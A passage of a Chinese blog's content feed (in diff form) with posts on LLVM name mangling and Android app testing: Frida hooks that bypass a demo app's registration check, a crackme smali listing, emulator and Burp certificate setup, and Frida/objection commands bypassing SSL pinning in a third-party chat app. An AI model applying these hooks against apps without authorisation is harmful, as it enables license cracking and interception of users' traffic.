&quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 7.0.0 (tags&#x2F;RELEASE_700&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现</p>
+<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add</span>(<span class="keyword">int</span> a,<span class="keyword">int</span> b);</span><br></pre></td></tr></table></figure>
+
+<p>生成的是：</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">define</span> <span class="keyword">linkonce_odr</span> dso_local <span class="keyword">i32</span> <span class="title">@_ZN1A3addEii</span>(<span class="symbol">%class.A</span>* <span class="symbol">%this</span>, <span class="keyword">i32</span> <span class="symbol">%a</span>, <span class="keyword">i32</span> <span class="symbol">%b</span>)</span><br></pre></td></tr></table></figure>
+
+<p>而</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>生成的是：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEiii(%<span class="keyword">class</span>.<span class="symbol">A</span>* %<span class="symbol">this, <span class="symbol">i32</span></span> %<span class="symbol">a, <span class="symbol">i32</span></span> %<span class="symbol">b, <span class="symbol">i32</span></span> %<span class="symbol">c</span>)</span><br></pre></td></tr></table></figure>
+
+<p>比两个参数多了一个i。</p>
+<p>而且类名和函数之间用一个数字连接。</p>
+]]></content>
+      <categories>
+        <category>程序分析</category>
+      </categories>
+      <tags>
+        <tag>LLVM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安卓测试(二)</title>
+    <url>/android%E6%B5%8B%E8%AF%95/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%BA%8C/</url>
+    <content><![CDATA[<p>此篇文章主要讲的是android中使用frida框架hook应用进程。</p>
+<a id="more"></a>
+
+<h1><span id="编写demo测试frida-api">编写demo测试frida api</span></h1><h2><span id="编写demo">编写demo</span></h2><p>Android Studio安装具体过程网上自行搜索。</p>
+<p>笔者当前AS版本：</p>
+<p><img src="/assets/image-20200607215916539.png" alt="image-20200607215916539"></p>
+<p>AS连接夜神简单方法：</p>
+<p><img src="/assets/image-20200607220848783.png" alt="image-20200607220848783"></p>
+<p>先新建一个空activity</p>
+<p><img src="/assets/image-20200607215820676.png" alt="image-20200607215820676"></p>
+<p>编写程序的思路是，一个简单的注册号检验，输入正确的校验号则成功激活，否则失败。</p>
+<p>绕过逻辑，hook掉判断成功失败的函数。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> TextView textView = (TextView)findViewById(R.id.editText_code);</span><br><span class="line">        textView.setEnabled(<span class="keyword">true</span>);</span><br><span class="line">        Button check = (Button)findViewById(R.id.button);</span><br><span class="line">        check.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(check(textView.getText().toString()))&#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"校验成功"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"校验失败"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String number)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> number.equals(<span class="string">"pass_word"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/assets/image-20200607223202986.png" alt="image-20200607223202986"></p>
+<p>现在hook app。</p>
+<p>首先生成带签名app</p>
+<p><img src="/assets/image-20200607223304658.png" alt="image-20200607223304658"></p>
+<h2><span id="frida测试">frida测试</span></h2><p>这里app没加壳，又有源码不用逆向，所以直接上手即可。</p>
+<p>check.js代码：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available)&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> checkMethod = Java.use(<span class="string">"blog.ydq6.demo1.MainActivity"</span>);</span><br><span class="line">        checkMethod.check.overload(<span class="string">"java.lang.String"</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">param</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"修改成功;\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后执行frida命令</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">frida -U -f blog.ydq6.demo1 -l F:<span class="symbol">\c</span>ode<span class="symbol">\A</span>ndroidProject<span class="symbol">\D</span>emo1<span class="symbol">\a</span>pp<span class="symbol">\h</span>ook<span class="symbol">\m</span>odifyCheck.js --no-pause</span><br></pre></td></tr></table></figure>
+
+<p>发现还是错误。</p>
+<p>参考网上教程：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">frida -U blog.ydq6.demo1 -l F:<span class="symbol">\c</span>ode<span class="symbol">\A</span>ndroidProject<span class="symbol">\D</span>emo1<span class="symbol">\a</span>pp<span class="symbol">\h</span>ook<span class="symbol">\m</span>odifyCheck.js</span><br></pre></td></tr></table></figure>
+
+<p>去掉了-f –no-pause选项。</p>
+<p>退出app,再重新打开，发现成功：<br><img src="/assets/image-20200607231641389.png" alt="image-20200607231641389"></p>
+<p><img src="/assets/image-20200607231659556.png" alt="image-20200607231659556"></p>
+<h2><span id="飞聊软件逆向分析">飞聊软件逆向分析</span></h2><p>将豌豆荚下载的飞聊apk放入jeb中反编译发现错误，猜测加了壳。</p>
+<p><img src="/assets/image-20200609165516555.png" alt="image-20200609165516555"></p>
+<p>放jadx发现信息出来了。</p>
+<p><img src="/assets/image-20200609213830362.png" alt="image-20200609213830362"></p>
+<p>很奇怪</p>
+<h2><span id="frida脱壳">frida脱壳</span></h2><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">frida -R -f com.gaotu100.superclass -l  N:<span class="symbol">\w</span>eiyun<span class="symbol">\D</span>ocuments<span class="symbol">\s</span>ecurity<span class="symbol">\a</span>ndroid_security<span class="symbol">\f</span>rida<span class="symbol">\F</span>rida-Scripts-master<span class="symbol">\u</span>npack<span class="symbol">\u</span>npack.js</span><br></pre></td></tr></table></figure>
+
+<p>发现没用，报错。</p>
+<h2><span id="xposed脱壳">xposed脱壳</span></h2><p>由于dumpdex不支持模拟器，所以换真机演示。</p>
+<h1><span id="frida-编程参考">frida 编程参考</span></h1><h1><span id="smali文件分析">smali文件分析</span></h1><p>源文件：</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">"Crackme.java"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># instance fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> private</span> str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 22</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 21</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 23</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 24</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 4</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"str"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v3, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 27</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 29</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"content"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v1, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iget-object </span>v2, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 30</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"kk"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> sget-object </span>v2, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0, v1&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2, v3&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-object </span>v2</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 8</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"content"</span>    <span class="comment"># [B</span></span><br><span class="line"><span class="keyword">    .param</span> p2, <span class="string">"password"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 35</span><br><span class="line">   <span class="built_in"> const/4 </span>v4, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 37</span><br><span class="line"><span class="keyword">    .local</span> v4, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :try_start_0</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line"><span class="keyword">    .local</span> v3, <span class="string">"keyStr"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v2, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v2, v3, v7&#125;, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span>-&gt;&lt;init&gt;([B<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 39</span><br><span class="line"><span class="keyword">    .local</span> v2, <span class="string">"key"</span>:<span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES/ECB/NoPadding"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v7&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;getInstance(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 40</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"cipher"</span>:<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v7, 0x2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v7, v2&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;init(I<span class="class">Ljava/security/Key;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 41</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, p1&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;doFinal([B)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 42</span><br><span class="line"><span class="keyword">    .local</span> v6, <span class="string">"result"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v5, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v5, v6&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line">   <span class="keyword"> :try_end_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/NoSuchAlgorithmException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_1</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/NoSuchPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/InvalidKeyException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_4</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/IllegalBlockSizeException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_2</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/BadPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .end local</span> v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .local</span> v5, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> move-object </span>v4, v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 46</span><br><span class="line"><span class="keyword">    .end local</span> v0    <span class="comment"># "cipher":Ljavax/crypto/Cipher;</span></span><br><span class="line"><span class="keyword">    .end local</span> v2    <span class="comment"># "key":Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"><span class="keyword">    .end local</span> v3    <span class="comment"># "keyStr":[B</span></span><br><span class="line"><span class="keyword">    .end local</span> v5    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .end local</span> v6    <span class="comment"># "result":[B</span></span><br><span class="line"><span class="keyword">    .restart</span> local v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :goto_0</span></span><br><span class="line">   <span class="built_in"> return-object </span>v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line">   <span class="keyword"> :catch_0</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 44</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"e"</span>:<span class="class">Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :goto_1</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/security/GeneralSecurityException;</span>-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line"><span class="keyword">    .end local</span> v1    <span class="comment"># "e":Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :catch_1</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_2</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_3</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_4</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2><span id="java类">JAVA类</span></h2><ul>
+<li>perform(function) 执行函数</li>
+<li>Java.use(className)  获取类名</li>
+</ul>
+]]></content>
+      <categories>
+        <category>android测试</category>
+      </categories>
+      <tags>
+        <tag>Frida</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安卓测试(一)</title>
+    <url>/android/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%B8%80/</url>
+    <content><![CDATA[<p>因为很多时候测试涉及到小程序和app的测试，而测试过程中可能遇到一些阻隔，所以开始学习android测试。</p>
+<a id="more"></a>
+
+<h1><span id="hook工具环境安装">hook工具环境安装</span></h1><p>用到工具</p>
+<ul>
+<li>夜深模拟器</li>
+<li>adb</li>
+</ul>
+<h2><span id="首先用adb调试夜神模拟器">首先用adb调试夜神模拟器。</span></h2><p>先查看adb版本：</p>
+<p><img src="/assets/image-20200607155844624.png" alt="image-20200607155844624"></p>
+<p>然后找到夜深浏览器所在目录，使用nox_adb.exe查看版本：</p>
+<p>[注]如何快速查找这两个工具所在位置用utool就可以。</p>
+<p><img src="/assets/image-20200607160116200.png" alt="image-20200607160116200"></p>
+<p>发现两个工具版本不一样。</p>
+<p>如果直接运行adb devices是不成功的。</p>
+<p><img src="/assets/image-20200607160225606.png" alt="image-20200607160225606"></p>
+<p>现在将nox_adb.exe改为nox_adb_bak.exe</p>
+<p>然后把adb.exe拷贝到夜神模拟器所在路径并改名为nox_adb.exe</p>
+<p><img src="/assets/image-20200607160725005.png" alt="image-20200607160725005"></p>
+<p>再次执行发现还是</p>
+<p><img src="/assets/image-20200607160909672.png" alt="image-20200607160909672"></p>
+<p>然后发现夜神由于打游戏用的平板模式，换成手机模式就好了：</p>
+<p><img src="/assets/image-20200607161207168.png" alt="image-20200607161207168"></p>
+<h2><span id="手机burp证书安装">手机burp证书安装</span></h2><p>（1）burp导出证书并修改后缀名为.cer</p>
+<p>（2）adb push 证书路径 /mnt/sdcard/gwolfs/cacert.cer</p>
+<p>（3）在手机上安装证书。</p>
+<p>设置-安全-从SD卡安装证书</p>
+<p>（4）配置代理</p>
+<p>[注]</p>
+<ul>
+<li>安卓文件系统的默认路径是：</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/storage/</span>emulated<span class="regexp">/0/</span></span><br></pre></td></tr></table></figure>
+
+<p>但是该路径是read-only的。</p>
+<ul>
+<li>adb shell 后面可以执行linux系统命令</li>
+</ul>
+<p><img src="/assets/image-20200607162415591.png" alt="image-20200607162415591"></p>
+<p><img src="/assets/image-20200607162613685.png" alt="image-20200607162613685"></p>
+<p><img src="/assets/image-20200607163557925.png" alt="image-20200607163557925"></p>
+<p><img src="/assets/image-20200607170223141.png" alt="image-20200607170223141"></p>
+<p><img src="/assets/image-20200607170238703.png" alt="image-20200607170238703"></p>
+<p><img src="/assets/image-20200607170759437.png" alt="image-20200607170759437"></p>
+<h2><span id="安装frida">安装Frida</span></h2><p>(1)pip install frida</p>
+<p>(2)github下载frida-server</p>
+<p>(3)adb push放入手机目录里</p>
+<p><img src="/assets/image-20200607171032384.png" alt="image-20200607171032384"></p>
+<p>（4）chmod 777 赋予赋予执行权限</p>
+<p><img src="/assets/image-20200607171427354.png" alt="image-20200607171427354"></p>
+<p>（5）启动frida-server服务器</p>
+<p><img src="/assets/image-20200607171513728.png" alt="image-20200607171513728"></p>
+<p>发现不对。想了想CPU架构有问题，夜神模拟器底层的CPU是基于本机的，是intel的，不是arm的，所以换成x86的导入即可。</p>
+<p><img src="/assets/image-20200607171823766.png" alt="image-20200607171823766"></p>
+<p>（6）在windows上使用<code>firda-ps -U</code>列出所有进程</p>
+<p><img src="/assets/image-20200607171938655.png" alt="image-20200607171938655"></p>
+<p>成功列出，环境搭建成功。</p>
+<h2><span id="安装xposed">安装Xposed</span></h2><p>下载xposed安装apk</p>
+<p>android5.0以下：</p>
+<p><a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
+<p>android5.0以上：</p>
+<p><a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">https://forum.xda-developers.com/showthread.php?t=3034811</a></p>
+<p>注意安装xposed需要root权限。</p>
+<p>安装apk后发现</p>
+<p><img src="/assets/image-20200609224324994.png" alt="image-20200609224324994"></p>
+<p>点击下面的安装，下载完成后安装成功。</p>
+<p><img src="/assets/image-20200609225733881.png" alt="image-20200609225733881"></p>
+<h1><span id="app抓包">App抓包</span></h1><h2><span id="ssl-pinning">SSL pinning</span></h2><h2><span id="绕过证书锁定">绕过证书锁定</span></h2><p>注意一点，当前frida-server不是以后台服务启动的，需要加个&amp;作为后台服务启动</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">./frida-server<span class="meta">&amp;</span></span><br></pre></td></tr></table></figure>
+
+<p>先前说到，利用<code>frida-ps -U</code>可以列举出模拟器中的所有进程。</p>
+<p>绕过证书锁定的原理是注入进程。所以可以根据列举进程命令找到需要注入的进程ID和名字，然后使用frida进行注入。</p>
+<p>（1）首先模拟器上打开app。</p>
+<p>（2）查看进程</p>
+<p><img src="/assets/image-20200607190745464.png" alt="image-20200607190745464"></p>
+<p>发现两个进程号。</p>
+<p>注意frida写python脚本时：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">get_remote_device</span><span class="params">()</span></span>   <span class="comment">//模拟器使用这个</span></span><br><span class="line"><span class="function"><span class="title">get_usb_device</span><span class="params">()</span></span>    <span class="comment">//usb设备用这个</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>绕过脚本来源：<a href="https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/" target="_blank" rel="noopener">https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</a></p>
+<p>因为脚本中会用到burp证书，所以先把burp证书复制到与frida-server一个目录下。</p>
+<p><img src="/assets/image-20200607180032085.png" alt="image-20200607180032085"></p>
+<p>然后执行脚本：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">frida</span> <span class="selector-tag">-U</span> <span class="selector-tag">-f</span> <span class="selector-tag">com</span><span class="selector-class">.feiliao</span><span class="selector-class">.flipchat</span><span class="selector-class">.android</span> <span class="selector-tag">-l</span> <span class="selector-tag">frida-android-repinning</span><span class="selector-class">.js</span> <span class="selector-tag">--no-pause</span></span><br></pre></td></tr></table></figure>
+
+<p>成功注入：</p>
+<p><img src="/assets/image-20200607190844347.png" alt="image-20200607190844347"></p>
+<p>不知道为什么爆红了，但实际抓包成功。</p>
+<p><img src="/assets/image-20200607191013245.png" alt="image-20200607191013245"></p>
+<h2><span id="objection">Objection</span></h2><p>发现objection工具自动的可以绕过。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install objection</span><br></pre></td></tr></table></figure>
+
+<h3><span id="方法一-动态交互式界面hook">方法一 动态交互式界面hook</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">objection</span> <span class="selector-tag">-g</span> <span class="selector-tag">com</span><span class="selector-class">.feiliao</span><span class="selector-class">.flipchat</span><span class="selector-class">.android</span> <span class="selector-tag">explore</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200607191337324.png" alt="image-20200607191337324"></p>
+<ul>
+<li><p>环境变量</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">env</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="/assets/image-20200607191439337.png" alt="image-20200607191439337"></p>
+<ul>
+<li>列举出所有activity.</li>
+</ul>
+<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">android hooking list activities        #还支持列举<span class="class"><span class="keyword">class</span>,<span class="type">services。</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200607203150653.png" alt="image-20200607203150653"></p>
+<ul>
+<li>memory管理</li>
+</ul>
